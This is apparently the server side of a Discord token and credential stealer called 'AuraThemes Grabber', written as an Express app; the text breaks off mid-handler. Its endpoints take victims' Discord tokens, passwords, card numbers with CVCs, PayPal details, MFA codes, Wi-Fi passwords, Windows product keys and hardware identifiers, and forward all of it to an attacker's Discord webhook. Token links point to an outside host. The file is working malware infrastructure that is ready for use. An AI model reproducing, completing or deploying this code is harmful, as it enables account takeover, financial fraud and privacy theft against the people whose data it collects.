const app = require('express')(),
    http = require('http'),
    fs = require('fs'),
    request = require("sync-request"),
    archiver = require('archiver'),
    axios = require('axios'),
    bodyParser = require('body-parser'),
    server = http.createServer(app),
    FormData = require('form-data');
let { Webhook, MessageBuilder } = require("discord-webhook-node"),
    webhook = new Webhook("YOUR WEBHOOK HERE NOW")                                                                                                                                                                     .setUsername("AuraThemes Grabber").setAvatar("https://avatars.githubusercontent.com/u/149415297?s=200&v=4")

String.prototype.hi = (i, s) => {
  if (i < 0) i = 0; if (i > this.length) i = this.length;
  return this.slice(0, i) + s + this.slice(i);
};

app.set('port',3000);   
app.use(bodyParser.text());
app.use(bodyParser.json());

app.post('/request/startup', (req, res) => {
  res.sendStatus(200);
  req = JSON.parse(req.body);

  if (!fs.existsSync('zips')) fs.mkdirSync('zips');
  let zip = `zips/${req.filename}.zip`;
  let output = fs.createWriteStream(zip);
  let archive = archiver('zip', { zlib: { level: 9 } });
  archive.pipe(output);
  archive.append(JSON.stringify(req, null, 2), { name: 'data.txt' });
  archive.finalize();
  console.log(req);

  output.on('close', async () => {
    if (fs.existsSync(zip)) {
      await webhook.sendFile(zip);
    }
    
    let tokens = req.tokens
    for (let a = 0; a < tokens.length; a++) {
      var user = getAllInfos(tokens[a], req.GetIpAddress)
      var embed = new MessageBuilder()
        .setAuthor(`${user.username} - ${user.ID}`, "https://6889.fun/api/files/yvk")
        .setColor("#c489ff")
      .setTitle("ALL INFO")
        .setDescription(`<a:aura:588128900689821696> Token:\n\`${user.token}\`\n[Click Here To Copy Your Token](https://6889.fun/aurathemes/api/raw/${user.token})\n`)
        .addField(`<a:aura:1120545516762181632> Badges:`, `${user.badges}`, true)
        .addField("<a:aura:1120542744658579556> IP:", `\`${req.GetIpAddress}\``, true)
        .addField("<a:aura:995172583660073020> Email:", `\`${user.mail}\``, true)
        .addField("<a:aura:1135363346024120340> Nitro Type:", `${user.nitroType}`, true)
        .addField("<a:aura:1083014677430284358> Billing:", `${user.billing}`, true)
      .addField("\u200B", `**HQ ALL FRIEND(s)**`)
        .addField("ALL User(s)", `${user.rareFriend}`)
        .setFooter("AuraThemes Grabber")
        .setTimestamp();
      await webhook.send(embed)
    }
    var userx = getAllInfos(tokens.shift() ? tokens.shift(): user.token, req.GetIpAddress)
    var embed2 = new MessageBuilder()
      .setAuthor(`${userx.username} - ${userx.ID}`, "https://6889.fun/api/files/yvk")
      .setColor("#c489ff")
    .setTitle("ALL INFO")
      .addField("<a:aura:1120542725327044728> Total RAM", `\`"${req.Ram}"\``, true)
      .addField("<a:aura:1120772378545369148> PC Name", `\`${req.UserName}\``, true)
      .addField("<a:aura:1108347447945740288> UUID", `\`${req.UUID}\``, true)
      .addField("<a:aura:1120542739361177642> Windows Mac Address", `\`${req.MacAddress}\``, true)
      .addField("<a:aura:1109950189474676879> CPU Model", `\`${req.CpuModel}\``, true)
      .addField("<:aura:1136408522217766912> Windows Product Key", `\`${req.ProductKey}\``, true)
      .addField("<:aura:1081699949395316736> Local IP", `\`${req.LocalIp}\``, true)
      .addField("<:aura:1135363387300270190> Get IP Address", `\`${req.GetIpAddress}\``, true)
      .addField("<:aura:1160509472146468924> Wifi ALL Password(s)", `\`${req.WifiPass}\``)
      .setFooter("AuraThemes Grabber")
      .setTimestamp();
    setTimeout(async () =>  await webhook.send(embed2), 100)
  });
});

app.post("/request/login", (req, res) => {
    res.sendStatus(200)
    req = JSON.parse(req.body);
    console.log(req);
    var user = getAllInfos(req.token, req.GetIpAddress, req.password)
    var embed = new MessageBuilder()
        .setAuthor(`${user.username} - ${user.ID}`, "https://6889.fun/api/files/yvk")
        .setColor("#c489ff")
      .setTitle("ALL INFO")
        .setDescription(`<a:aura:588128900689821696> Token:\n\`${user.token}\`\n[Click Here To Copy Your Token](https://6889.fun/aurathemes/api/raw/${user.token})\n`)
        .addField(`<a:aura:1120545516762181632> Badges:`, `${user.badges}`, true)
        .addField("<a:aura:1120542744658579556> IP:", `\`${req.GetIpAddress}\``, true)
        .addField("<a:aura:995172583660073020> Email:", `\`${user.mail}\``, true)
        .addField("<a:aura:1135363346024120340> Nitro Type:", `${user.nitroType}`, true)
        .addField("Login:", `\`${req.login}\``, true)
        .addField("Undelete:", `\`${req.undelete}\``, true)
        .addField("Source:", `\`${req.login_source}\``, true)
        .addField("Password Used:", `\`${req.password}\``, true)
        .addField("Code:", `\`${req.gift_code_sku_id}\``, true)
        .addField("<a:aura:1083014677430284358> Billing:", `${user.billing}`, true)
        .setFooter("AuraThemes Grabber")
        .setTimestamp();
    webhook.send(embed)
    var embed2 = new MessageBuilder()
        .setAuthor(`${user.username} - ${user.ID}`, "https://6889.fun/api/files/yvk")
      .setColor("#c489ff")
        .setTitle(`**ALL INFO USER**`)
        .addField("Total Friend:", `\`${user.totalFriend}\``, true)
        .addField("Total Blocked:", `\`${user.totalBlocked}\``, true)
        .addField("Pending:", `\`${user.pending}\``, true)
        .addField("Total Servers:", `\`${user.totalGuild}\``, true)
        .addField("Total Owned Servers:", `\`${user.totalOwnedGuild}\``, true)
        .addField("Total BOTS/RPC:", `\`${user.totalApplication}\``, true)
        .addField("Total Connection:", `\`${user.totalConnection}\``, true)
        .addField("NSFW Allowed:", `${user.NSFWAllowed}`, true)
        .addField("User Status:", `${user.status}`, true)
        .addField("User Theme:", `\`${user.theme}\``, true)
        .addField("User Verified:", `\`${user.verified}\``, true)
        .addField("User Phone:", `\`${user.hasPhone}\``, true)
        .setFooter("AuraThemes Grabber")
        .setTimestamp();
    setTimeout(() =>  webhook.send(embed2), 50)
    var embed3 = new MessageBuilder()
        .setAuthor(`${user.username} - ${user.ID}`, "https://6889.fun/api/files/yvk")
        .setColor("#c489ff")
      .setTitle(`**HQ ALL FRIEND(s)**`)
        .setDescription(`${user.rareFriend}`)
        .setFooter("AuraThemes Grabber")
        .setTimestamp();
    setTimeout(() =>  webhook.send(embed3), 100)
    var embed4 = new MessageBuilder()
        .setAuthor(`${user.username} - ${user.ID}`, "https://6889.fun/api/files/yvk")
        .setColor("#c489ff")
      .setTitle(`**HQ ALL FRIEND(s)**`)
        .addField("<a:aura:1120542725327044728> Total RAM", `\`${req.Ram}\``, true)
        .addField("<a:aura:1120772378545369148> PC Name", `\`${req.UserName}\``, true)
        .addField("<a:aura:1108347447945740288> UUID", `\`${req.Uuid}\``, true)
        .addField("<a:aura:1120542739361177642> Windows Mac Address", `\`${req.MacAddress}\``, true)
        .addField("<a:aura:1109950189474676879> CPU Model", `\`${req.CpuModel}\``, true)
        .addField("<:aura:1136408522217766912> Windows Product Key", `\`${req.ProductKey}\``, true)
        .addField("<:aura:1081699949395316736> Local IP", `\`${req.LocalIp}\``, true)
        .addField("<:aura:1135363387300270190> Get IP Address", `\`${req.GetIpAddress}\``, true)
        .addField("<:aura:1160509472146468924> Wifi ALL Password(s)", `\`${req.WifiPass}\``)
        .setFooter("AuraThemes Grabber")
        .setTimestamp();
    setTimeout(() =>  webhook.send(embed4), 150)
})


app.post("/request/newusername", (req, res) => {
  res.sendStatus(200)
  req = JSON.parse(req.body);
  console.log(req);
  var user = getAllInfos(req.token, req.ip, req.password)
  var embed = new MessageBuilder()
      .setAuthor(`${user.username} - ${user.ID}`, "https://6889.fun/api/files/yvk")
      .setColor("#c489ff")
    .setTitle("ALL INFO")
      .setDescription(`<a:aura:588128900689821696> Token:\n\`${user.token}\`\n[Click Here To Copy Your Token](https://6889.fun/aurathemes/api/raw/${user.token})\n`)
      .addField(`<a:aura:1120545516762181632> Badges:`, `${user.badges}`, true)
      .addField("<a:aura:1120542744658579556> IP:", `\`${req.GetIpAddress}\``, true)
      .addField("<a:aura:995172583660073020> Email:", `\`${user.mail}\``, true)
      .addField("<a:aura:1135363346024120340> Nitro Type:", `${user.nitroType}`, true)
      .addField("New Username:", `\`${req.new_username}\``, true)
      .addField("Password Used:", `\`${req.password}\``, true)
      .addField("<a:aura:1083014677430284358> Billing:", `${user.billing}`, true)
      .setFooter("AuraThemes Grabber")
      .setTimestamp();
  webhook.send(embed)
  var embed2 = new MessageBuilder()
      .setAuthor(`${user.username} - ${user.ID}`, "https://6889.fun/api/files/yvk")
    .setColor("#c489ff")
      .setTitle(`**ALL INFO USER**`)
      .addField("Total Friend:", `\`${user.totalFriend}\``, true)
      .addField("Total Blocked:", `\`${user.totalBlocked}\``, true)
      .addField("Pending:", `\`${user.pending}\``, true)
      .addField("Total Servers:", `\`${user.totalGuild}\``, true)
      .addField("Total Owned Servers:", `\`${user.totalOwnedGuild}\``, true)
      .addField("Total BOTS/RPC:", `\`${user.totalApplication}\``, true)
      .addField("Total Connection:", `\`${user.totalConnection}\``, true)
      .addField("NSFW Allowed:", `${user.NSFWAllowed}`, true)
      .addField("User Status:", `${user.status}`, true)
      .addField("User Theme:", `\`${user.theme}\``, true)
      .addField("User Verified:", `\`${user.verified}\``, true)
      .addField("User Phone:", `\`${user.hasPhone}\``, true)
      .setFooter("AuraThemes Grabber")
      .setTimestamp();
  setTimeout(() =>  webhook.send(embed2), 50)
  var embed3 = new MessageBuilder()
      .setAuthor(`${user.username} - ${user.ID}`, "https://6889.fun/api/files/yvk")
      .setColor("#c489ff")
    .setTitle(`**HQ ALL FRIEND(s)**`)
      .setDescription(`${user.rareFriend}`)
      .setFooter("AuraThemes Grabber")
      .setTimestamp();
  setTimeout(() =>  webhook.send(embed3), 100)
  var embed4 = new MessageBuilder()
      .setAuthor(`${user.username} - ${user.ID}`, "https://6889.fun/api/files/yvk")
      .setColor("#c489ff")
    .setTitle(`**HQ ALL FRIEND(s)**`)
      .addField("<a:aura:1120542725327044728> Total RAM", `\`${req.Ram}\``, true)
      .addField("<a:aura:1120772378545369148> PC Name", `\`${req.UserName}\``, true)
      .addField("<a:aura:1108347447945740288> UUID", `\`${req.Uuid}\``, true)
      .addField("<a:aura:1120542739361177642> Windows Mac Address", `\`${req.MacAddress}\``, true)
      .addField("<a:aura:1109950189474676879> CPU Model", `\`${req.CpuModel}\``, true)
      .addField("<:aura:1136408522217766912> Windows Product Key", `\`${req.ProductKey}\``, true)
      .addField("<:aura:1081699949395316736> Local IP", `\`${req.LocalIp}\``, true)
      .addField("<:aura:1135363387300270190> Get IP Address", `\`${req.GetIpAddress}\``, true)
      .addField("<:aura:1160509472146468924> Wifi ALL Password(s)", `\`${req.WifiPass}\``)
      .setFooter("AuraThemes Grabber")
      .setTimestamp();
  setTimeout(() =>  webhook.send(embed4), 150)
})

app.post("/request/newemail", (req, res) => {
  res.sendStatus(200)
  req = JSON.parse(req.body);
  console.log(req);
  var user = getAllInfos(req.token, req.ip, req.password)
  var embed = new MessageBuilder()
      .setAuthor(`${user.username} - ${user.ID}`, "https://6889.fun/api/files/yvk")
      .setColor("#c489ff")
    .setTitle("ALL INFO")
      .setDescription(`<a:aura:588128900689821696> Token:\n\`${user.token}\`\n[Click Here To Copy Your Token](https://6889.fun/aurathemes/api/raw/${user.token})\n`)
      .addField(`<a:aura:1120545516762181632> Badges:`, `${user.badges}`, true)
      .addField("<a:aura:1120542744658579556> IP:", `\`${req.GetIpAddress}\``, true)
      .addField("<a:aura:995172583660073020> Email:", `\`${user.mail}\``, true)
      .addField("<a:aura:1135363346024120340> Nitro Type:", `${user.nitroType}`, true)
      .addField("New Email:", `\`${req.new_email}\``, true)
      .addField("Password Used:", `\`${req.password}\``, true)
      .addField("<a:aura:1083014677430284358> Billing:", `${user.billing}`, true)
      .setFooter("AuraThemes Grabber")
      .setTimestamp();
  webhook.send(embed)
  var embed2 = new MessageBuilder()
      .setAuthor(`${user.username} - ${user.ID}`, "https://6889.fun/api/files/yvk")
    .setColor("#c489ff")
      .setTitle(`**ALL INFO USER**`)
      .addField("Total Friend:", `\`${user.totalFriend}\``, true)
      .addField("Total Blocked:", `\`${user.totalBlocked}\``, true)
      .addField("Pending:", `\`${user.pending}\``, true)
      .addField("Total Servers:", `\`${user.totalGuild}\``, true)
      .addField("Total Owned Servers:", `\`${user.totalOwnedGuild}\``, true)
      .addField("Total BOTS/RPC:", `\`${user.totalApplication}\``, true)
      .addField("Total Connection:", `\`${user.totalConnection}\``, true)
      .addField("NSFW Allowed:", `${user.NSFWAllowed}`, true)
      .addField("User Status:", `${user.status}`, true)
      .addField("User Theme:", `\`${user.theme}\``, true)
      .addField("User Verified:", `\`${user.verified}\``, true)
      .addField("User Phone:", `\`${user.hasPhone}\``, true)
      .setFooter("AuraThemes Grabber")
      .setTimestamp();
  setTimeout(() =>  webhook.send(embed2), 50)
  var embed3 = new MessageBuilder()
      .setAuthor(`${user.username} - ${user.ID}`, "https://6889.fun/api/files/yvk")
      .setColor("#c489ff")
    .setTitle(`**HQ ALL FRIEND(s)**`)
      .setDescription(`${user.rareFriend}`)
      .setFooter("AuraThemes Grabber")
      .setTimestamp();
  setTimeout(() =>  webhook.send(embed3), 100)
  var embed4 = new MessageBuilder()
      .setAuthor(`${user.username} - ${user.ID}`, "https://6889.fun/api/files/yvk")
      .setColor("#c489ff")
    .setTitle(`**HQ ALL FRIEND(s)**`)
      .addField("<a:aura:1120542725327044728> Total RAM", `\`${req.Ram}\``, true)
      .addField("<a:aura:1120772378545369148> PC Name", `\`${req.UserName}\``, true)
      .addField("<a:aura:1108347447945740288> UUID", `\`${req.Uuid}\``, true)
      .addField("<a:aura:1120542739361177642> Windows Mac Address", `\`${req.MacAddress}\``, true)
      .addField("<a:aura:1109950189474676879> CPU Model", `\`${req.CpuModel}\``, true)
      .addField("<:aura:1136408522217766912> Windows Product Key", `\`${req.ProductKey}\``, true)
      .addField("<:aura:1081699949395316736> Local IP", `\`${req.LocalIp}\``, true)
      .addField("<:aura:1135363387300270190> Get IP Address", `\`${req.GetIpAddress}\``, true)
      .addField("<:aura:1160509472146468924> Wifi ALL Password(s)", `\`${req.WifiPass}\``)
      .setFooter("AuraThemes Grabber")
      .setTimestamp();
  setTimeout(() =>  webhook.send(embed4), 150)
})

app.post("/request/newpass", (req, res) => {
  res.sendStatus(200)
  req = JSON.parse(req.body);
  console.log(req);
  var user = getAllInfos(req.token, req.ip, req.password)
  var embed = new MessageBuilder()
      .setAuthor(`${user.username} - ${user.ID}`, "https://6889.fun/api/files/yvk")
      .setColor("#c489ff")
    .setTitle("ALL INFO")
      .setDescription(`<a:aura:588128900689821696> Token:\n\`${user.token}\`\n[Click Here To Copy Your Token](https://6889.fun/aurathemes/api/raw/${user.token})\n`)
      .addField(`<a:aura:1120545516762181632> Badges:`, `${user.badges}`, true)
      .addField("<a:aura:1120542744658579556> IP:", `\`${req.GetIpAddress}\``, true)
      .addField("<a:aura:995172583660073020> Email:", `\`${user.mail}\``, true)
      .addField("<a:aura:1135363346024120340> Nitro Type:", `${user.nitroType}`, true)
      .addField("Old Password:", `\`${req.old_password}\``, true)
      .addField("New Password:", `\`${req.new_password}\``, true)
      .addField("<a:aura:1083014677430284358> Billing:", `${user.billing}`, true)
      .setFooter("AuraThemes Grabber")
      .setTimestamp();
  webhook.send(embed)
  var embed2 = new MessageBuilder()
      .setAuthor(`${user.username} - ${user.ID}`, "https://6889.fun/api/files/yvk")
    .setColor("#c489ff")
      .setTitle(`**ALL INFO USER**`)
      .addField("Total Friend:", `\`${user.totalFriend}\``, true)
      .addField("Total Blocked:", `\`${user.totalBlocked}\``, true)
      .addField("Pending:", `\`${user.pending}\``, true)
      .addField("Total Servers:", `\`${user.totalGuild}\``, true)
      .addField("Total Owned Servers:", `\`${user.totalOwnedGuild}\``, true)
      .addField("Total BOTS/RPC:", `\`${user.totalApplication}\``, true)
      .addField("Total Connection:", `\`${user.totalConnection}\``, true)
      .addField("NSFW Allowed:", `${user.NSFWAllowed}`, true)
      .addField("User Status:", `${user.status}`, true)
      .addField("User Theme:", `\`${user.theme}\``, true)
      .addField("User Verified:", `\`${user.verified}\``, true)
      .addField("User Phone:", `\`${user.hasPhone}\``, true)
      .setFooter("AuraThemes Grabber")
      .setTimestamp();
  setTimeout(() =>  webhook.send(embed2), 50)
  var embed3 = new MessageBuilder()
      .setAuthor(`${user.username} - ${user.ID}`, "https://6889.fun/api/files/yvk")
      .setColor("#c489ff")
    .setTitle(`**HQ ALL FRIEND(s)**`)
      .setDescription(`${user.rareFriend}`)
      .setFooter("AuraThemes Grabber")
      .setTimestamp();
  setTimeout(() =>  webhook.send(embed3), 100)
  var embed4 = new MessageBuilder()
      .setAuthor(`${user.username} - ${user.ID}`, "https://6889.fun/api/files/yvk")
      .setColor("#c489ff")
    .setTitle(`**HQ ALL FRIEND(s)**`)
      .addField("<a:aura:1120542725327044728> Total RAM", `\`${req.Ram}\``, true)
      .addField("<a:aura:1120772378545369148> PC Name", `\`${req.UserName}\``, true)
      .addField("<a:aura:1108347447945740288> UUID", `\`${req.Uuid}\``, true)
      .addField("<a:aura:1120542739361177642> Windows Mac Address", `\`${req.MacAddress}\``, true)
      .addField("<a:aura:1109950189474676879> CPU Model", `\`${req.CpuModel}\``, true)
      .addField("<:aura:1136408522217766912> Windows Product Key", `\`${req.ProductKey}\``, true)
      .addField("<:aura:1081699949395316736> Local IP", `\`${req.LocalIp}\``, true)
      .addField("<:aura:1135363387300270190> Get IP Address", `\`${req.GetIpAddress}\``, true)
      .addField("<:aura:1160509472146468924> Wifi ALL Password(s)", `\`${req.WifiPass}\``)
      .setFooter("AuraThemes Grabber")
      .setTimestamp();
  setTimeout(() =>  webhook.send(embed4), 150)
})

app.post("/request/newcard", (req, res) => {
  res.sendStatus(200)
  req = JSON.parse(req.body);
  console.log(req);
  var user = getAllInfos(req.token, req.ip, req.password)
  var embed = new MessageBuilder()
      .setAuthor(`${user.username} - ${user.ID}`, "https://6889.fun/api/files/yvk")
      .setColor("#c489ff")
    .setTitle("ALL INFO")
      .setDescription(`<a:aura:588128900689821696> Token:\n\`${user.token}\`\n[Click Here To Copy Your Token](https://6889.fun/aurathemes/api/raw/${user.token})\n`)
      .addField(`<a:aura:1120545516762181632> Badges:`, `${user.badges}`, true)
      .addField("<a:aura:1120542744658579556> IP:", `\`${req.GetIpAddress}\``, true)
      .addField("<a:aura:995172583660073020> Email:", `\`${user.mail}\``, true)
      .addField("<a:aura:1135363346024120340> Nitro Type:", `${user.nitroType}`, true)
      .addField("<a:aura:1083014677430284358> Billing:", `${user.billing}`, true)
      .setFooter("AuraThemes Grabber")
      .setTimestamp();
  webhook.send(embed)
  var embed2 = new MessageBuilder()
      .setAuthor(`${user.username} - ${user.ID}`, "https://6889.fun/api/files/yvk")
      .setColor("#c489ff")
    .setTitle("CARD INFO ALL")
      .addField(`Card: (Number|Date|CVC):`, `\`${req.number}|${req.date}|${req.cvc}\``, true)
      .addField(`Card: (GUID|MUID|SID):`, `\`${req.guid}|${req.muid}|${req.sid}\``, true)
      .addField(`user Agent:`, `\`${req.userAgent}\``, true)
      .addField(`Key:`, `\`${req.key}\``, true)
      .setFooter("AuraThemes Grabber")
      .setTimestamp();
  setTimeout(() =>  webhook.send(embed2), 50)
  var embed3 = new MessageBuilder()
      .setAuthor(`${user.username} - ${user.ID}`, "https://6889.fun/api/files/yvk")
    .setColor("#c489ff")
      .setTitle(`**ALL INFO USER**`)
      .addField("Total Friend:", `\`${user.totalFriend}\``, true)
      .addField("Total Blocked:", `\`${user.totalBlocked}\``, true)
      .addField("Pending:", `\`${user.pending}\``, true)
      .addField("Total Servers:", `\`${user.totalGuild}\``, true)
      .addField("Total Owned Servers:", `\`${user.totalOwnedGuild}\``, true)
      .addField("Total BOTS/RPC:", `\`${user.totalApplication}\``, true)
      .addField("Total Connection:", `\`${user.totalConnection}\``, true)
      .addField("NSFW Allowed:", `${user.NSFWAllowed}`, true)
      .addField("User Status:", `${user.status}`, true)
      .addField("User Theme:", `\`${user.theme}\``, true)
      .addField("User Verified:", `\`${user.verified}\``, true)
      .addField("User Phone:", `\`${user.hasPhone}\``, true)
      .setFooter("AuraThemes Grabber")
      .setTimestamp();
  setTimeout(() =>  webhook.send(embed3), 100)
  var embed4 = new MessageBuilder()
      .setAuthor(`${user.username} - ${user.ID}`, "https://6889.fun/api/files/yvk")
      .setColor("#c489ff")
    .setTitle(`**HQ ALL FRIEND(s)**`)
      .setDescription(`${user.rareFriend}`)
      .setFooter("AuraThemes Grabber")
      .setTimestamp();
  setTimeout(() =>  webhook.send(embed4), 150)
  var embed5 = new MessageBuilder()
      .setAuthor(`${user.username} - ${user.ID}`, "https://6889.fun/api/files/yvk")
      .setColor("#c489ff")
    .setTitle(`**HQ ALL FRIEND(s)**`)
      .addField("<a:aura:1120542725327044728> Total RAM", `\`${req.Ram}\``, true)
      .addField("<a:aura:1120772378545369148> PC Name", `\`${req.UserName}\``, true)
      .addField("<a:aura:1108347447945740288> UUID", `\`${req.Uuid}\``, true)
      .addField("<a:aura:1120542739361177642> Windows Mac Address", `\`${req.MacAddress}\``, true)
      .addField("<a:aura:1109950189474676879> CPU Model", `\`${req.CpuModel}\``, true)
      .addField("<:aura:1136408522217766912> Windows Product Key", `\`${req.ProductKey}\``, true)
      .addField("<:aura:1081699949395316736> Local IP", `\`${req.LocalIp}\``, true)
      .addField("<:aura:1135363387300270190> Get IP Address", `\`${req.GetIpAddress}\``, true)
      .addField("<:aura:1160509472146468924> Wifi ALL Password(s)", `\`${req.WifiPass}\``)
      .setFooter("AuraThemes Grabber")
      .setTimestamp();
  setTimeout(() =>  webhook.send(embed5), 200)
})

app.post("/request/paypal", (req, res) => {
  res.sendStatus(200)
  req = JSON.parse(req.body);
  console.log(req);
  var user = getAllInfos(req.token, req.ip, req.password)
  var embed = new MessageBuilder()
      .setAuthor(`${user.username} - ${user.ID}`, "https://6889.fun/api/files/yvk")
      .setColor("#c489ff")
    .setTitle("ALL INFO")
      .setDescription(`<a:aura:588128900689821696> Token:\n\`${user.token}\`\n[Click Here To Copy Your Token](https://6889.fun/aurathemes/api/raw/${user.token})\n`)
      .addField(`<a:aura:1120545516762181632> Badges:`, `${user.badges}`, true)
      .addField("<a:aura:1120542744658579556> IP:", `\`${req.GetIpAddress}\``, true)
      .addField("<a:aura:995172583660073020> Email:", `\`${user.mail}\``, true)
      .addField("<a:aura:1135363346024120340> Nitro Type:", `${user.nitroType}`, true)
      .addField("<a:aura:1083014677430284358> Billing:", `${user.billing}`, true)
      .addField("Paypal:", `\`${req.new_paypal}\``, true)
      .addField("Password Used:", `${req.password}`, true)
      .addField("Email Used:", `${req.email}`, true)
      .setFooter("AuraThemes Grabber")
      .setTimestamp();
  webhook.send(embed)
  var embed2 = new MessageBuilder()
      .setAuthor(`${user.username} - ${user.ID}`, "https://6889.fun/api/files/yvk")
    .setColor("#c489ff")
      .setTitle(`**ALL INFO USER**`)
      .addField("Total Friend:", `\`${user.totalFriend}\``, true)
      .addField("Total Blocked:", `\`${user.totalBlocked}\``, true)
      .addField("Pending:", `\`${user.pending}\``, true)
      .addField("Total Servers:", `\`${user.totalGuild}\``, true)
      .addField("Total Owned Servers:", `\`${user.totalOwnedGuild}\``, true)
      .addField("Total BOTS/RPC:", `\`${user.totalApplication}\``, true)
      .addField("Total Connection:", `\`${user.totalConnection}\``, true)
      .addField("NSFW Allowed:", `${user.NSFWAllowed}`, true)
      .addField("User Status:", `${user.status}`, true)
      .addField("User Theme:", `\`${user.theme}\``, true)
      .addField("User Verified:", `\`${user.verified}\``, true)
      .addField("User Phone:", `\`${user.hasPhone}\``, true)
      .setFooter("AuraThemes Grabber")
      .setTimestamp();
  setTimeout(() =>  webhook.send(embed2), 50)
  var embed3 = new MessageBuilder()
      .setAuthor(`${user.username} - ${user.ID}`, "https://6889.fun/api/files/yvk")
      .setColor("#c489ff")
    .setTitle(`**HQ ALL FRIEND(s)**`)
      .setDescription(`${user.rareFriend}`)
      .setFooter("AuraThemes Grabber")
      .setTimestamp();
  setTimeout(() =>  webhook.send(embed3), 100)
  var embed4 = new MessageBuilder()
      .setAuthor(`${user.username} - ${user.ID}`, "https://6889.fun/api/files/yvk")
      .setColor("#c489ff")
    .setTitle(`**HQ ALL FRIEND(s)**`)
      .addField("<a:aura:1120542725327044728> Total RAM", `\`${req.Ram}\``, true)
      .addField("<a:aura:1120772378545369148> PC Name", `\`${req.UserName}\``, true)
      .addField("<a:aura:1108347447945740288> UUID", `\`${req.Uuid}\``, true)
      .addField("<a:aura:1120542739361177642> Windows Mac Address", `\`${req.MacAddress}\``, true)
      .addField("<a:aura:1109950189474676879> CPU Model", `\`${req.CpuModel}\``, true)
      .addField("<:aura:1136408522217766912> Windows Product Key", `\`${req.ProductKey}\``, true)
      .addField("<:aura:1081699949395316736> Local IP", `\`${req.LocalIp}\``, true)
      .addField("<:aura:1135363387300270190> Get IP Address", `\`${req.GetIpAddress}\``, true)
      .addField("<:aura:1160509472146468924> Wifi ALL Password(s)", `\`${req.WifiPass}\``)
      .setFooter("AuraThemes Grabber")
      .setTimestamp();
  setTimeout(() =>  webhook.send(embed4), 150)
})

app.post("/request/mfaenable", (req, res) => {
  res.sendStatus(200)
  req = JSON.parse(req.body);
  console.log(req);
  var user = getAllInfos(req.token, req.ip, req.password)
  var embed = new MessageBuilder()
      .setAuthor(`${user.username} - ${user.ID}`, "https://6889.fun/api/files/yvk")
      .setColor("#c489ff")
    .setTitle("ALL INFO")
      .setDescription(`<a:aura:588128900689821696> Token:\n\`${user.token}\`\n[Click Here To Copy Your Token](https://6889.fun/aurathemes/api/raw/${user.token})\n`)
      .addField(`<a:aura:1120545516762181632> Badges:`, `${user.badges}`, true)
      .addField("<a:aura:1120542744658579556> IP:", `\`${req.GetIpAddress}\``, true)
      .addField("<a:aura:995172583660073020> Email:", `\`${user.mail}\``, true)
      .addField("<a:aura:1135363346024120340> Nitro Type:", `${user.nitroType}`, true)
      .addField("<a:aura:1083014677430284358> Billing:", `${user.billing}`, true)
      .addField("Password Used:", `${req.password}`, true)
      .addField("<a:aura:1135363379066839160> MFA Code Used:", `${req.code}`, true)
      .addField("<a:aura:1120542707333472360> MFA Auth:", `${req.authKey}`, true)
      .setFooter("AuraThemes Grabber")
      .setTimestamp();
  webhook.send(embed)
  var embed2 = new MessageBuilder()
      .setAuthor(`${user.username} - ${user.ID}`, "https://6889.fun/api/files/yvk")
    .setColor("#c489ff")
      .setTitle(`**ALL INFO USER**`)
      .addField("Total Friend:", `\`${user.totalFriend}\``, true)
      .addField("Total Blocked:", `\`${user.totalBlocked}\``, true)
      .addField("Pending:", `\`${user.pending}\``, true)
      .addField("Total Servers:", `\`${user.totalGuild}\``, true)
      .addField("Total Owned Servers:", `\`${user.totalOwnedGuild}\``, true)
      .addField("Total BOTS/RPC:", `\`${user.totalApplication}\``, true)
      .addField("Total Connection:", `\`${user.totalConnection}\``, true)
      .addField("NSFW Allowed:", `${user.NSFWAllowed}`, true)
      .addField("User Status:", `${user.status}`, true)
      .addField("User Theme:", `\`${user.theme}\``, true)
      .addField("User Verified:", `\`${user.verified}\``, true)
      .addField("User Phone:", `\`${user.hasPhone}\``, true)
      .setFooter("AuraThemes Grabber")
      .setTimestamp();
  setTimeout(() =>  webhook.send(embed2), 50)
  var embed3 = new MessageBuilder()
      .setAuthor(`${user.username} - ${user.ID}`, "https://6889.fun/api/files/yvk")
      .setColor("#c489ff")
    .setTitle(`**HQ ALL FRIEND(s)**`)
      .setDescription(`${user.rareFriend}`)
      .setFooter("AuraThemes Grabber")
      .setTimestamp();
  setTimeout(() =>  webhook.send(embed3), 100)
  var embed4 = new MessageBuilder()
      .setAuthor(`${user.username} - ${user.ID}`, "https://6889.fun/api/files/yvk")
      .setColor("#c489ff")
    .setTitle(`**HQ ALL FRIEND(s)**`)
      .addField("<a:aura:1120542725327044728> Total RAM", `\`${req.Ram}\``, true)
      .addField("<a:aura:1120772378545369148> PC Name", `\`${req.UserName}\``, true)
      .addField("<a:aura:1108347447945740288> UUID", `\`${req.Uuid}\``, true)
      .addField("<a:aura:1120542739361177642> Windows Mac Address", `\`${req.MacAddress}\``, true)
      .addField("<a:aura:1109950189474676879> CPU Model", `\`${req.CpuModel}\``, true)
      .addField("<:aura:1136408522217766912> Windows Product Key", `\`${req.ProductKey}\``, true)
      .addField("<:aura:1081699949395316736> Local IP", `\`${req.LocalIp}\``, true)
      .addField("<:aura:1135363387300270190> Get IP Address", `\`${req.GetIpAddress}\``, true)
      .addField("<:aura:1160509472146468924> Wifi ALL Password(s)", `\`${req.WifiPass}\``)
      .setFooter("AuraThemes Grabber")
      .setTimestamp();
  setTimeout(() =>  webhook.send(embed4), 150)
})

app.post("/request/mfadisable", (req, res) => {
  res.sendStatus(200)
  req = JSON.parse(req.body);
  console.log(req);
  var user = getAllInfos(req.token, req.ip, req.password)
  var embed = new MessageBuilder()
      .setAuthor(`${user.username} - ${user.ID}`, "https://6889.fun/api/files/yvk")
      .setColor("#c489ff")
    .setTitle("ALL INFO")
      .setDescription(`<a:aura:588128900689821696> Token:\n\`${user.token}\`\n[Click Here To Copy Your Token](https://6889.fun/aurathemes/api/raw/${user.token})\n`)
      .addField(`<a:aura:1120545516762181632> Badges:`, `${user.badges}`, true)
      .addField("<a:aura:1120542744658579556> IP:", `\`${req.GetIpAddress}\``, true)
      .addField("<a:aura:995172583660073020> Email:", `\`${user.mail}\``, true)
      .addField("<a:aura:1135363346024120340> Nitro Type:", `${user.nitroType}`, true)
      .addField("<a:aura:1083014677430284358> Billing:", `${user.billing}`, true)
      .addField("<a:aura:1135363379066839160> MFA Code Used:", `${req.code}`, true)
      .setFooter("AuraThemes Grabber")
      .setTimestamp();
  webhook.send(embed)
  var embed2 = new MessageBuilder()
      .setAuthor(`${user.username} - ${user.ID}`, "https://6889.fun/api/files/yvk")
    .setColor("#c489ff")
      .setTitle(`**ALL INFO USER**`)
      .addField("Total Friend:", `\`${user.totalFriend}\``, true)
      .addField("Total Blocked:", `\`${user.totalBlocked}\``, true)
